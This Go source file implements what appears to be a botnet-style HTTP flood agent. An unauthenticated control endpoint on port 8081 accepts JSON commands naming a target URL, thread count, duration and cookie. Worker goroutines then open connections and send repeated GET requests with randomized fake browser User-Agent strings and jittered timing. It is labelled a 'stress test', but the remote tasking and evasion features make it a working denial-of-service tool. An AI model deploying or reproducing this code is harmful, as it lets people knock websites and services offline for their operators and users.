package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"
)

type Command struct {
	Action  string `json:"action"`
	URL     string `json:"url"`
	Threads int    `json:"threads"`
	Timer   int    `json:"timer"`
	Cookie  string `json:"cookie"`
}

var (
	ip         string
	port       int
	path       string
	threads    int
	timer      int
	cookie     string
	activeTest bool
	cancelFunc context.CancelFunc
	mu         sync.Mutex

	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "firefox", "edge", "safari"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getUserAgent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
	} else if browser == "firefox" {
		version := fmt.Sprintf("%d.0", rand.Intn(99))
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
	} else if browser == "edge" {
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
	} else {
		version := fmt.Sprintf("%d.0", rand.Intn(99))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
	}
}

func getHeader() string {
	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
	header += fmt.Sprintf("Host: %s\r\n", ip)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	header += "Accept-Encoding: gzip, deflate\r\n"
	header += "Accept-Language: en-US,en;q=0.5\r\n"
	if cookie != "" {
		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
	}
	header += "Connection: keep-alive\r\n\r\n"
	return header
}

func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
	defer wg.Done()

	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	address := fmt.Sprintf("%s:%d", ip, port)

	for {
		select {
		case <-ctx.Done():
			return
		case count := <-requestCount:
			var conn net.Conn
			var err error

			if port == 443 {
				conn, err = tls.Dial("tcp", address, tlsConfig)
			} else {
				conn, err = net.Dial("tcp", address)
			}

			if err != nil {
				fmt.Printf("Worker %d: connection error: %v\n", id, err)
				continue
			}

			header := getHeader()
			for i := 0; i < count; i++ {
				time.Sleep(time.Millisecond * time.Duration(rand.Intn(100))) // Randomized delay
				_, err := conn.Write([]byte(header))
				if err != nil {
					fmt.Printf("Worker %d: write error: %v\n", id, err)
					break
				}
			}
			conn.Close()
		}
	}
}

func startTest(urlStr string, threads, timer int, cookieStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}

	path = parsedURL.Path
	if path == "" {
		path = "/"
	}
	cookie = cookieStr

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
	cancelFunc = cancel

	var wg sync.WaitGroup
	requestCount := make(chan int, threads)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(ctx, i, &wg, requestCount)
	}

	// Dispatch requests to workers
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for t := 0; t < timer; t++ {
			<-ticker.C
			for i := 0; i < threads; i++ {
				requestCount <- rand.Intn(151) + 50 // Randomized load per thread
			}
		}
		close(requestCount)
	}()

	wg.Wait()
	mu.Lock()
	activeTest = false
	mu.Unlock()
	fmt.Println("Stress test completed.")
}

func controlHandler(w http.ResponseWriter, r *http.Request) {
	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "Invalid command format", http.StatusBadRequest)
		return
	}

	if cmd.Action == "start" && !activeTest {
		mu.Lock()
		activeTest = true
		mu.Unlock()

		go startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
		w.Write([]byte("Test started"))
		return
	}

	http.Error(w, "Invalid or conflicting command", http.StatusConflict)
}

func statusHandler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	status := "Ready"
	if activeTest {
		status = "Sending"
	}

	json.NewEncoder(w).Encode(map[string]string{"status": status})
}

func main() {
	http.HandleFunc("/control", controlHandler)
	http.HandleFunc("/status", statusHandler)
	fmt.Println("Agent is running on port 8081")
	http.ListenAndServe(":8081", nil)
}
